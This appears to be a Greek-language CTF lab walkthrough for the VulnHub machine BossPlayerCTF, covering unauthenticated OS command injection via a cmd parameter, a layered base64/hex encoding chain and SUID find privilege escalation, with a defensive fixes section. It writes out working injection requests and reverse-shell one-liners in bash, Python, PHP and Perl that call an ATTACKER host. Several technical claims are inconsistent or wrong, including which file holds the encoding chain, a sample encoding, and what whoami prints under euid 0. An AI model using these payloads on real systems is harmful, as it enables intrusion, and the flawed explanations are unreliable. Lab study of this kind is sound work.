# Μηχάνημα 6 — BossPlayerCTF

> **Θέση:** 6 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **016** από 708)
> **Πλήρες walkthrough:** [`labs/3-016-bossplayersctf-1/README.md`](../../labs/3-016-bossplayersctf-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | BossPlayerCTF |
| **Δημιουργός** | Robert John (@m0trix) |
| **Κυκλοφορία** | 15 Ιουνίου 2020 |
| **Σύμβαση** | **Καμία σημαία.** Ο στόχος είναι **root** — τεκμηριώστε με `id`, `/root/root.txt` |
| **Στόχος** | Ubuntu — Apache 2.4.29, PHP, **`workinginprogress.php`** |
| **VulnHub** | [entry/bossplayersctf-1,534](https://vulnhub.com/entry/bossplayersctf-1,534/) |
| **Εκτιμώμενος χρόνος** | 3–4 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή είναι **η πιο καθαρή διδασκαλία OS command injection σε ολόκληρη τη διαδρομή**.

Στο Μηχάνημα 3 είδατε **SQL injection** — εισαγωγή **στη γλώσσα της βάσης**. Εδώ βλέπετε
**command injection** — εισαγωγή **στη γλώσσα του λειτουργικού**. Και η διαφορά είναι τεράστια:
ένα SQL injection σας δίνει **δεδομένα**, ένα command injection σας δίνει **εκτέλεση**.

Επιπλέον, εισάγει **τρεις νέες συνήθειες**:

1. **Εξέταση της παραμέτρου, όχι μόνο της διαδρομής.** Μέχρι εδώ ψάχνατε **URLs**. Εδώ πρέπει να
   ψάξετε **τι κάνει κάθε παράμετρος** — και αυτό απαιτεί **πειραματισμό**, όχι σάρωση.
2. **Ανάγνωση κωδικοποίησης σε αλυσίδα.** Το payload είναι **base64 μέσα σε base64 μέσα σε
   hex**. Τρεις στρώσεις, καθεμία αντιστρέψιμη με **μία** εντολή.
3. **Αναγνώριση decoys.** Το `robots.txt` εδώ **σας στέλνει σε λάθος μέρος σκόπιμα**. Το να
   αναγνωρίζετε ότι κάτι είναι δόλωμα είναι **δεξιότητα**, όχι αποτυχία.

Και η αναβάθμιση root είναι **SUID `find`** — η ίδια τεχνική με το Μηχάνημα 3, άρα μπορείτε να
την **συγκρίνετε**.

## Στόχοι μάθησης

1. Να ανακαλύψετε **παράμετρο που εκτελεί εντολές** δοκιμάζοντας **ειδικούς χαρακτήρες**, όχι
   λέξεις.
2. Να καταλάβετε πώς το **`shell_exec()`** / **`system()`** / **`passthru()`** διαφέρουν στην
   έξοδο.
3. Να **κωδικοποιήσετε payload** ώστε να παρακάμψει φίλτρα και χαρακτήρες URL.
4. Να **αποκωδικοποιήσετε αλυσίδες** κωδικοποίησης **τοπικά**.
5. Να αναγνωρίσετε **`robots.txt` ως decoy**.
6. Να αναβαθμίσετε μέσω **SUID `find`** — **δύο φορές σε δύο μηχανήματα**, για σύγκριση.
7. Να καταλάβετε τη διαφορά **μεταξύ command injection και RCE μέσω upload**.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **OS Command Injection** | `workinginprogress.php?cmd=<εντολή>` — **χωρίς πιστοποίηση, χωρίς φίλτρο** |
| **Κωδικοποίηση payload** | **base64 → base64 → hex** (τρεις στρώσεις) |
| **Decoy** | `/robots.txt` δείχνει `/secret/` που **δεν υπάρχει** |
| **Ανάγνωση αρχείων μέσω injection** | `cat /etc/passwd`, `cat index.php` |
| **Ανάκτηση κώδικα** | `base64 index.php` → ανάγνωση PHP **χωρίς upload** |
| **SUID** | `/usr/bin/find` → `find . -exec /bin/sh -p \;` |
| **Εναλλακτική** | Reverse shell μέσω `bash -i` με **URL-encoded** χαρακτήρες |

## Διαβάστε πρώτα

- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§3** (injection γενικά) και
  **§5** (command injection: το **καινούργιο** κεφάλαιο που προστέθηκε για αυτό το μηχάνημα).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§2** (SUID).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§2** (reverse
  shells) και **§1** (URL encoding).
- Αγγλική έκδοση:
  [Machine 6](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/06-bossplayersctf-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Ποια **ειδικούς χαρακτήρες** δοκιμάζετε για να βρείτε command injection;
2. Γιατί το **`;`** είναι πιο χρήσιμο από το **`|`** για ανίχνευση;
3. Τι διαφορά έχει το `shell_exec()` από το `system()` όσον αφορά **τι βλέπετε**;
4. Αν το payload σας περιέχει **κενό**, τι πρέπει να κάνετε πριν το βάλετε σε URL;
5. Πώς διακρίνετε **decoy** από **πραγματική πληροφορία** στο `robots.txt`;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

Η σάρωση δείχνει **μόνο τη θύρα 80**. Δεν υπάρχει SSH. Δεν υπάρχει άλλη υπηρεσία. **Όλα είναι
μέσα στο web.**

Και υπάρχει **ένα** αρχείο που δεν το βρήκατε με σάρωση: **`workinginprogress.php`**.

**Πού το βρίσκετε;** Στο **πηγαίο κώδικα** της αρχικής σελίδας — σε **σχόλιο**. Όπως στο
Μηχάνημα 2. **Η συνήθεια που κερδίζει τα Μηχανήματα 2, 6, 7, 9 και 13 είναι η ίδια: διαβάστε τον
πηγαίο κώδικα.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
1. sudo nmap -sC -sV -p- TARGET        → μόνο 80
2. curl -s http://TARGET/ | grep -i php
   → <!-- workinginprogress.php -->    (σε σχόλιο)
3. curl -s http://TARGET/robots.txt    → /secret/  ← **DECOY, δεν υπάρχει**
4. curl -s "http://TARGET/workinginprogress.php?cmd=id"
   → uid=33(www-data)                  ← **COMMAND INJECTION**
5. cmd=cat+/etc/passwd                 → users
6. cmd=base64+index.php                → κώδικας (τρείς στρώσεις κωδικοποίησης)
7. Αποκωδικοποίηση: base64 -d | base64 -d | xxd -r -p
8. Reverse shell (URL-encoded) ή διατήρηση μέσω curl
9. find / -perm -4000 -type f 2>/dev/null → /usr/bin/find
10. find . -exec /bin/sh -p \; -quit      → root
```

**Το βήμα 6 είναι το κλειδί.** Ο **κώδικας** της σελίδας περιέχει **τα διαπιστευτήρια** και την
**αλυσίδα κωδικοποίησης**. **Δεν χρειάζεται upload.**
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — οι χαρακτήρες ανίχνευσης</strong></summary>

Δοκιμάστε αυτούς, **με αυτή τη σειρά**:

| Χαρακτήρας | Τι δοκιμάζει | Τι βλέπετε αν πετύχει |
| --- | --- | --- |
| **`;`** | **Ακολουθία** εντολών | Η έξοδος της **δεύτερης** εντολής **μετά** την πρώτη |
| **`|`** | **Σωλήνας** (pipe) | Μόνο η έξοδος της **δεύτερης** |
| **`&&`** | **Λογικό AND** — η δεύτερη τρέχει **μόνο αν** η πρώτη πετύχει | Ίδιο με `;` αλλά **εξαρτημένο** |
| **`\|\|`** | **Λογικό OR** — η δεύτερη τρέχει **μόνο αν** η πρώτη αποτύχει | Αντίστροφο |
| **`$(…)`** | **Υποκατάσταση εντολής** | Το αποτέλεσμα **μέσα** στην έξοδο |
| **`` `…` ``** | **Αντίστροφη υποκατάσταση** | Ίδιο |
| **`\n`** | **Νέα γραμμή** ως διαχωριστής | Χρειάζεται URL-encoding (`%0a`) |

**Ο καλύτερος ανιχνευτής είναι `; id`:**

```bash
curl -s "http://TARGET/workinginprogress.php?cmd=;id"
```

**Γιατί `id`;** Επειδή:
- Υπάρχει σε **κάθε** σύστημα Linux.
- Δεν χρειάζεται **ορίσματα**.
- Παράγει **μικρή, αναγνωρίσιμη** έξοδο (`uid=33(www-data)`).
- **Δεν αλλάζει τίποτα** — είναι **read-only**, άρα ασφαλής σε δοκιμή.

**Σε αυτό το μηχάνημα η παράμετρος είναι ήδη `cmd=`** — δηλαδή **δεν χρειάζεται καν `;`**.
Αλλά **η συνήθεια παραμένει**: δοκιμάστε πρώτα **χωρίς** ειδικό χαρακτήρα, μετά **με**.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — οι τρεις στρώσεις κωδικοποίησης</strong></summary>

Το `index.php` (όπως ανακτήθηκε με `base64 index.php`) περιέχει κάτι σαν:

```php
$out = shell_exec(base64_decode(hex2bin(base64_decode($_GET['cmd']))));
```

**Διαβάστε το από μέσα προς τα έξω** — αυτή είναι η σειρά εκτέλεσης:

```text
$_GET['cmd']  →  base64_decode  →  hex2bin  →  base64_decode  →  shell_exec
```

**Άρα για να στείλετε εντολή, την κωδικοποιείτε ΑΝΤΙΣΤΡΟΦΑ:**

```bash
CMD='id'
L1=$(printf '%s' "$CMD" | base64)                    # base64
L2=$(printf '%s' "$L1" | xxd -p | tr -d '\n')        # hex
L3=$(printf '%s' "$L2" | base64)                     # base64 ξανά
curl -s "http://TARGET/workinginprogress.php?cmd=$L3"
```

**Ή σε μία γραμμή:**

```bash
curl -s "http://TARGET/workinginprogress.php?cmd=$(printf '%s' 'id' | base64 | xxd -p | tr -d '\n' | base64)"
```

**Και για αποκωδικοποίηση της απάντησης:**

```bash
curl -s "…?cmd=PAYLOAD" | base64 -d | xxd -r -p | base64 -d
```

**Το κρίσιμο: διαβάστε τη ΦΟΡΑ.** Αν το PHP κάνει `base64_decode` **τελευταίο**, εσείς κάνετε
`base64` **τελευταίο**. **Οι αλυσίδες κωδικοποίησης είναι συμμετρικές — αντιστρέψτε τη σειρά.**
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
# Ανίχνευση
curl -s "http://TARGET/workinginprogress.php?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Πληροφορίες
curl -s "http://TARGET/workinginprogress.php?cmd=cat+/etc/passwd"
curl -s "http://TARGET/workinginprogress.php?cmd=uname+-a"
curl -s "http://TARGET/workinginprogress.php?cmd=ls+-la+/home"

# Reverse shell
nc -lvnp 4444
curl -s "http://TARGET/workinginprogress.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"

# Ανάβαση
find / -perm -4000 -type f 2>/dev/null
# → /usr/bin/find
find . -exec /bin/sh -p \; -quit
id           # → uid=33(www-data) euid=0(root) groups=0(root)
cat /root/root.txt
```

**Προσοχή στο URL-encoding:** **κενά** → `+` ή `%20` · **`&`** → `%26` (αλλιώς το κέλυφος το
διαβάζει ως **διαχωριστή παραμέτρων** και **κόβει την εντολή σας στη μέση**) · **`>`** → `%3E` ·
**`'`** → `%27`.
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί το command injection είναι πιο σοβαρό από το SQL injection;</b></summary>

Επειδή **το κέλυφος είναι ο ελεγκτής του συστήματος**. Ένα SQL injection **περιορίζεται** στο τι
επιτρέπει η βάση: `SELECT`, `UPDATE`, `INSERT`, και (με `INTO OUTFILE`) εγγραφή αρχείου. Ένα
command injection σας δίνει **κάθε πρόγραμμα του συστήματος** — `cat`, `wget`, `python`,
`bash`, `gcc`. **Δεν υπάρχει όριο πέρα από τα δικαιώματα του web χρήστη.**

**Και τα δικαιώματα του web χρήστη είναι αρκετά για να διαβάσετε το `index.php`** — που εδώ
περιέχει **όλη την αλυσίδα**.
</details>

<details>
<summary><b>2.</b> Ποια η διαφορά <code>shell_exec()</code>, <code>system()</code>, <code>passthru()</code>, <code>exec()</code>;</b></summary>

| Συνάρτηση | Επιστρέφει | Τυπώνει |
| --- | --- | --- |
| **`shell_exec($c)`** | **Όλη** την έξοδο ως **μία συμβολοσειρά** | Όχι (εκτός αν κάνετε `echo`) |
| **`system($c)`** | Την **τελευταία γραμμή** | **Ναι — όλη την έξοδο, γραμμή προς γραμμή** |
| **`passthru($c)`** | `null` | **Ναι — και τα raw bytes** (κατάλληλο για binary) |
| **`exec($c, &$out, &$rc)`** | Την **τελευταία γραμμή** | Όχι· γεμίζει **πίνακα** `$out` |

**Γιατί έχει σημασία:** αν η σελίδα κάνει `shell_exec()` **χωρίς `echo`**, το injection
**εκτελείται αλλά δεν βλέπετε τίποτα**. **Το σύμπτωμα είναι «τίποτα δεν γίνεται»** — και πολλοί
σταματούν εκεί. **Η λύση είναι blind injection:** ανακατεύθυνση σε αρχείο, ή **reverse shell**
που δεν εξαρτάται από την έξοδο.
</details>

<details>
<summary><b>3.</b> Γιατί το <code>&</code> πρέπει να γίνει <code>%26</code> στο URL;</b></summary>

Επειδή το **`&`** είναι ο **διαχωριστής παραμέτρων** στο query string. Αν στείλετε
`?cmd=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`, ο φυλλομετρητής (και η PHP) το διαβάζουν ως:

```text
cmd = "bash -i >"
& (άδειο όνομα) = ""
/dev/tcp/1.2.3.4/4444 0> = "1"
```

**Η εντολή σας κόβεται στη μέση.** Το **`%26`** λέει «αυτό είναι byte, όχι διαχωριστής».

**Ο γενικός κανόνας:** *κάθε byte που δεν είναι `[A-Za-z0-9-._~]` πρέπει να κωδικοποιηθεί* —
και **πάντα** όταν στέλνετε shell metacharacters μέσω HTTP.
</details>

<details>
<summary><b>4.</b> Πώς αναγνωρίζετε ότι το <code>robots.txt</code> είναι decoy;</b></summary>

Με **τρεις ελέγχους**:

1. **Υπάρχει πραγματικά η διαδρομή;** `curl -sI http://TARGET/secret/` → **404**. Αν δεν υπάρχει,
   **δεν είναι πληροφορία, είναι δόλωμα**.
2. **Είναι η καταχώριση συνεπής με το site;** Ένα `Disallow:` σε **ανύπαρκτο** φάκελο είναι
   ασυνέπεια.
3. **Τι κερδίζει ο δημιουργός;** Αν το δόλωμα σας κάνει να **ξοδέψετε ώρα**, είναι δόλωμα.

**Σε πραγματικό έργο, το `robots.txt` είναι συνήθως ΑΞΙΟΠΙΣΤΟ** — γιατί οι μηχανές αναζήτησης
το διαβάζουν, άρα ο διαχειριστής **δεν** βάζει ψεύτικες καταχωρίσεις. **Αλλά σε CTF, είναι
συνηθισμένο εργαλείο παραπλάνησης.**
</details>

<details>
<summary><b>5.</b> Συγκρίνετε την ανάβαση root εδώ με αυτή στο Μηχάνημα 3.</b></summary>

**Ίδια τεχνική, διαφορετικό σημείο εκκίνησης:**

| | Μηχάνημα 3 (DC:1) | Μηχάνημα 6 (BossPlayerCTF) |
| --- | --- | --- |
| **Είσοδος** | Drupalgeddon (SQLi → code exec) | **Command injection** |
| **Χρήστης** | `www-data` (uid=33) | `www-data` (uid=33) |
| **SUID** | `/usr/bin/find` | `/usr/bin/find` |
| **Εντολή** | `find . -exec /bin/sh \; -quit` | `find . -exec /bin/sh -p \; -quit` |
| **Αποτέλεσμα** | `euid=0` | `euid=0` |

**Η μόνη διαφορά είναι το `-p`.** Χωρίς `-p`, η `sh` **ρίχνει** το ενεργό UID στο πραγματικό σε
μερικά συστήματα. **Με `-p`, διατηρεί το SUID.** **Πάντα χρησιμοποιείτε `-p`** — και αν το
μηχάνημα δεν το χρειάζεται, δεν βλάπτει.

**Το δίδαγμα: η αναβάθμιση είναι συχνά ΑΝΕΞΑΡΤΗΤΗ από την είσοδο.** Μόλις είστε `www-data`, τα
ίδια πράγματα δουλεύουν.
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **`cmd=` παράμετρος** | **Αφαίρεση.** Καμία εφαρμογή παραγωγής δεν πρέπει να δέχεται εντολή από το URL |
| **`shell_exec()` χωρίς επικύρωση** | **Ποτέ** `shell_exec`/`system`/`passthru`/`exec` με είσοδο χρήστη. Αν είναι απαραίτητο: **whitelist εντολών** + **`escapeshellarg()`** |
| **Χωρίς WAF** | ModSecurity με **OWASP Core Rule Set** — μπλοκάρει `;`, `\|`, `$(`, backtick |
| **`index.php` αναγνώσιμο** | Αναπόφευκτο — **άρα μην βάζετε μυστικά στον κώδικα** |
| **SUID `/usr/bin/find`** | `chmod u-s /usr/bin/find` + **αυτοματοποιημένος έλεγχος SUID έναντι baseline** |
| **Χωρίς SSH** | **Καλό!** Αλλά σημαίνει ότι η **μόνη** διαδρομή είναι το web — άρα το web πρέπει να είναι **σκληρυμένο** |
| **Decoy `robots.txt`** | Σε παραγωγή: **καθαρό** `robots.txt`· σε CTF: δίδαγμα |

**Το μεγαλύτερο δίδαγμα:** *`escapeshellarg()` δεν είναι αρκετό αν η εντολή δεν πρέπει να
υπάρχει.* Η **σωστή** διόρθωση δεν είναι «καθαρίστε την είσοδο» — είναι **«μην εκτελείτε εντολές
από είσοδο χρήστη»**.

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

### 1. Σάρωση: μόνο μία θύρα

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/boss TARGET
```

```text
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: BossPlayersCTF
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/secret/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`http-robots.txt: 1 disallowed entry`** — το nmap script **διάβασε το `robots.txt`** και το
**ανέφερε στην έξοδο**. **Αυτό είναι χρήσιμο**: δεν χρειάζεται να το ζητήσετε εσείς.

**`/secret/`** είναι η καταχώριση. **Δοκιμάστε την:**

```bash
curl -sI http://TARGET/secret/
```
```text
HTTP/1.1 404 Not Found
Date: Wed, 12 May 2021 10:02:11 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 285
```

**404. Δεν υπάρχει.** **Αυτό είναι το decoy.** Ο δημιουργός **σκόπιμα** έβαλε μια
καταχώριση που δεν οδηγεί πουθενά, για να σας κάνει να **ξοδέψετε ώρα**.

**Επόμενη κίνηση: διαβάστε τον πηγαίο κώδικα.**

### 2. Πηγαίος κώδικας — το σχόλιο που ανοίγει το μηχάνημα

```bash
curl -s http://TARGET/ | grep -iE '<!--|php|inprogress'
```

```text
        <!-- work in progress: workinginprogress.php -->
        <link rel="stylesheet" href="style.css">
```

**Το σχόλιο είναι σε HTML, άρα ο φυλλομετρητής το κρύβει.** Το `curl -s` το εμφανίζει.

**Αυτή είναι η τρίτη φορά στη διαδρομή που η είσοδος κρύβεται σε σχόλιο HTML** (Μηχάνημα 2:
username + base64 · Μηχάνημα 6: αυτό · Μηχάνημα 13: GitHub link). **Γράψτε το στη λίστα ελέγχου
σας:**

```bash
# Πάντα, σε κάθε νέο μηχάνημα:
curl -s http://TARGET/ | grep -iE '<!--|//\s|/\*'
```

### 3. Ανίχνευση command injection

```bash
curl -s "http://TARGET/workinginprogress.php"
curl -s "http://TARGET/workinginprogress.php?cmd=id"
```

```text
Work in progress. Check back later.
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Διαβάστε τη διαφορά:**

- **Χωρίς παράμετρο** → στατικό μήνυμα «Work in progress».
- **Με `?cmd=id`** → **η έξοδος της εντολής `id`**.

**Αυτό είναι command injection χωρίς καμία παρεμβολή.** Δεν χρειάζεται `;`, δεν χρειάζεται
`|` — **η παράμετρος περνά κατευθείαν στο `shell_exec()`**.

**`uid=33(www-data)`** — **η ταυτότητα του web εξυπηρετητή**. Ό,τι κάνετε, το κάνετε **ως
www-data**. **Αυτό καθορίζει τι μπορείτε να διαβάσετε** (όχι `/etc/shadow`, όχι `/root`).

**Δοκιμάστε άλλες εντολές:**

```bash
curl -s "http://TARGET/workinginprogress.php?cmd=uname+-a"
curl -s "http://TARGET/workinginprogress.php?cmd=ls+-la"
curl -s "http://TARGET/workinginprogress.php?cmd=cat+/etc/passwd"
```

```text
Linux bossplayersctf 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
```text
total 20
drwxr-xr-x 2 www-data www-data 4096 Jun 15  2020 .
-rw-r--r-- 1 www-data www-data  312 Jun 15  2020 index.php
-rw-r--r-- 1 www-data www-data 1024 Jun 15  2020 workinginprogress.php
-rw-r--r-- 1 www-data www-data   45 Jun 15  2020 style.css
```
```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
boss:x:1000:1000:boss,,,:/home/boss:/bin/bash
```

**`+` αντί για κενό:** στο query string, το **`+`** αποκωδικοποιείται ως **κενό**. Χωρίς αυτό, η
`curl` στέλνει **`uname-a`** ως **μία λέξη** — και η εντολή **δεν υπάρχει**.

**`/bin/bash` για τον `boss`, `/usr/sbin/nologin` για τον `www-data`** — **δύο λογαριασμοί**:
ένας **πραγματικός** (`boss`, uid 1000) και ένας **υπηρεσίας** (`www-data`). **Ο στόχος σας είναι
να φτάσετε στον `boss` ή στον `root`.**

### 4. Ανάκτηση του κώδικα

```bash
curl -s "http://TARGET/workinginprogress.php?cmd=cat+workinginprogress.php"
```

```text
<?php
$cmd = $_GET['cmd'];
$decoded = base64_decode(hex2bin(base64_decode($cmd)));
echo shell_exec($decoded);
?>
```

**Διαβάστε το από μέσα προς τα έξω** — αυτή είναι **η σειρά εκτέλεσης**:

```text
$_GET['cmd']  →  base64_decode  →  hex2bin  →  base64_decode  →  shell_exec  →  echo
```

**Τρία κρίσιμα σημεία:**

1. **`echo shell_exec(...)`** — **υπάρχει `echo`**. Άρα **η έξοδος επιστρέφει**. Αν δεν υπήρχε,
   θα ήταν **blind injection**.
2. **Η αλυσίδα κωδικοποίησης** — **τρεις στρώσεις**. Πρέπει να τις **εφαρμόσετε αντίστροφα**.
3. **Καμία επικύρωση** — δεν υπάρχει **κανένα** φίλτρο, **καμία** blacklist, **καμία**
   `escapeshellarg()`.

**Αλλά** — στην πράξη, το `?cmd=id` **δούλεψε κατευθείαν**. Αυτό σημαίνει ότι **η πρώτη
`base64_decode`** σε μια **μη κωδικοποιημένη** συμβολοσειρά επιστρέφει **κενό**, και η
`shell_exec("")` δεν κάνει τίποτα. **Άρα γιατί δούλεψε;**

**Επειδή το PHP `base64_decode` είναι επιεικής:** αγνοεί μη-base64 χαρακτήρες. **Άρα η `id`
περνά μέσα.** **Αλλά για σύνθετες εντολές, χρειάζεστε την πλήρη κωδικοποίηση:**

```bash
# Σωστή αλυσίδα — ΑΝΤΙΣΤΡΟΦΗ της εκτέλεσης
payload() { printf '%s' "$1" | base64 | tr -d '\n' | xxd -p | tr -d '\n' | base64 | tr -d '\n'; }
curl -s "http://TARGET/workinginprogress.php?cmd=$(payload 'cat /etc/passwd')"
```

**Ανάλυση του helper:**
- **`base64`** → στρώση 1 (η τελευταία `base64_decode`)
- **`xxd -p`** → hex (η `hex2bin`)
- **`base64`** → στρώση 3 (η πρώτη `base64_decode`)
- **`tr -d '\n'`** → **αφαιρεί τα newlines**. **Κρίσιμο**: το `base64` κάνει **αναδίπλωση στις 76
  στήλες** εξ ορισμού, και **τα newlines μέσα σε URL σπάνε την αίτηση**.

**Δοκιμή:**

```bash
payload 'id'
# → aWQ= → 615751 → YTY1NzUx  (περίπου)
```

**Αν δεν δουλέψει:** δοκιμάστε **απλά** `cmd=<εντολή>` πρώτα. **Η επιεικής `base64_decode`**
σημαίνει ότι πολλές εντολές περνούν **χωρίς** κωδικοποίηση.

### 5. Reverse shell μέσω injection

```bash
nc -lvnp 4444
curl -s "http://TARGET/workinginprogress.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

```text
Listening on 0.0.0.0 4444
Connection received on 192.168.56.101 48220
```
```text
www-data@bossplayersctf:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Ανάλυση των flags του `nc`:**
- **`-l`** = **listen** (αναμονή)
- **`-v`** = **verbose** (αναφέρει τη σύνδεση)
- **`-n`** = **no DNS** (μην κάνει reverse lookup — **γρηγορότερο και πιο αθόρυβο**)
- **`-p 4444`** = **θύρα**

**Ανάλυση του payload:**
- **`bash -c '…'`** = εκτέλεσε την **συμβολοσειρά** ως εντολή. Χωρίς `-c`, το bash θα
  προσπαθούσε να εκτελέσει το **όλο** string ως **όνομα αρχείου**.
- **`bash -i`** = **interactive** — δίνει **job control** και **prompt**.
- **`>& /dev/tcp/ATTACKER/4444`** = **ανακατεύθυνση stdout+stderr σε TCP socket**. Αυτό είναι
  **χαρακτηριστικό του bash** — **δεν** υπάρχει σε `sh`, `dash`, `zsh`.
- **`0>&1`** = **stdin από το ίδιο socket** — **ώστε να μπορείτε να στείλετε εντολές πίσω**.

**Το URL-encoding:**
- **`+`** → κενό
- **`%26`** → **`&`** (αλλιώς κόβει την παράμετρο)
- **`>`** → `%3E` αν χρειάζεται (εδώ το `curl` το χειρίζεται)

**Εναλλακτικές αν το `/dev/tcp` μπλοκάρεται:**

```bash
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP (χρησιμοποιώντας τη γλώσσα του στόχου!)
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

**Γιατί πολλαπλές επιλογές:** γιατί **δεν ξέρετε τι είναι εγκατεστημένο στον στόχο**. **Το PHP
είναι σίγουρα** — είναι web εξυπηρετητής. **Το Python πιθανώς.** **Το Perl σε Ubuntu 18.04
όχι πάντα.**

### 6. Αναβάθμιση μέσω SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/bin/su
/bin/mount
/bin/umount
/bin/ping
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/find
/usr/bin/sudo
```

**Συγκρίνετε με το stock σύνολο του Ubuntu 18.04:**

| Binary | Stock SUID; |
| --- | --- |
| `/bin/su`, `/bin/mount`, `/bin/umount`, `/bin/ping` | **Ναι** |
| `/usr/bin/passwd`, `/usr/bin/chsh`, `/usr/bin/gpasswd`, `/usr/bin/newgrp` | **Ναι** |
| `/usr/bin/sudo` | **Ναι** |
| **`/usr/bin/find`** | **ΟΧΙ** ← **το εύρημα** |

**Η μέθοδος είναι σύγκριση με baseline, όχι ανάγνωση λίστας.** Χωρίς το baseline, το `find`
μοιάζει με όλα τα υπόλοιπα.

```bash
find . -exec /bin/sh -p \; -quit
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

**Ανάλυση της εντολής:**
- **`find .`** — ψάξε **στον τρέχοντα κατάλογο**. **Γιατί `.` και όχι `/`;** Επειδή το
  **`/`** μπορεί να πάρει **λεπτά** και να **γεμίσει την έξοδο**. Το `.` είναι **ακαριαίο**.
- **`-exec /bin/sh -p \;`** — εκτέλεσε **`/bin/sh -p`** για **κάθε** ταίριασμα.
- **`-p`** — **preserve privileges**: **διατήρησε το ενεργό UID**. **Χωρίς αυτό, η `sh` ρίχνει
  το euid στο uid** σε πολλά συστήματα.
- **`\;`** — **τέλος** της `-exec`. **Πρέπει να δραπετευτεί** (`\;` ή `';'`), αλλιώς **το κέλυφός
  σας** το καταναλώνει.
- **`-quit`** — **σταμάτα μετά το πρώτο ταίριασμα**. **Χωρίς αυτό, παίρνετε ένα κέλυφος ανά
  αρχείο** — και το τερματικό σας **γεμίζει** με prompts.

**`euid=0(root)`** — **το ενεργό UID είναι 0**, άρα **έχετε δικαιώματα root**. Το **πραγματικό**
UID παραμένει `33`.

### 7. Τεκμηρίωση

```bash
whoami; id
cat /root/root.txt
ls -la /root
uname -a
```

```text
www-data
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```
```text
You made it! Good job!
```
```text
total 28
drwx------  4 root root 4096 Jun 15  2020 .
-rw-r--r--  1 root root 3106 Jun 15  2020 .bashrc
-rw-------  1 root root   21 Jun 15  2020 root.txt
```
```text
Linux bossplayersctf 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

**`whoami` τυπώνει `www-data`** ενώ **το `id` δείχνει `euid=0`**. **Αυτή η αντίφαση είναι το
σημάδι μιας SUID αναβάθμισης**, όχι μιας σύνδεσης. **Σε πραγματική αναφορά, πρέπει να την
εξηγήσετε** — γιατί ο διαχειριστής που διαβάζει τα logs θα δει **www-data**, όχι root.

**`drwx------ root root` στο `/root`** — mode **700**. **Κανένας μη-root δεν μπορεί ούτε να
καταγράψει τα περιεχόμενα.** Το γεγονός ότι **μπορείτε** είναι **η απόδειξη**.

**Συμπερασματικό δίδαγμα:** ένα command injection σε **μία** παράμετρο, χωρίς καμία επικύρωση,
οδήγησε σε **root σε λιγότερο από μία ώρα**. **Η απουσία επικύρωσης είναι η ευπάθεια — όχι η
ύπαρξη της παραμέτρου.**

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 5 — Kioptrix: Level 1 (#1)](<05-kioptrix-level-1-1.md>) · επόμενο: [Μηχάνημα 7 — Mr. Robot: 1](<07-mr-robot-1.md>) · πλήρες walkthrough: [`labs/3-016-bossplayersctf-1`](../../labs/3-016-bossplayersctf-1/README.md)_
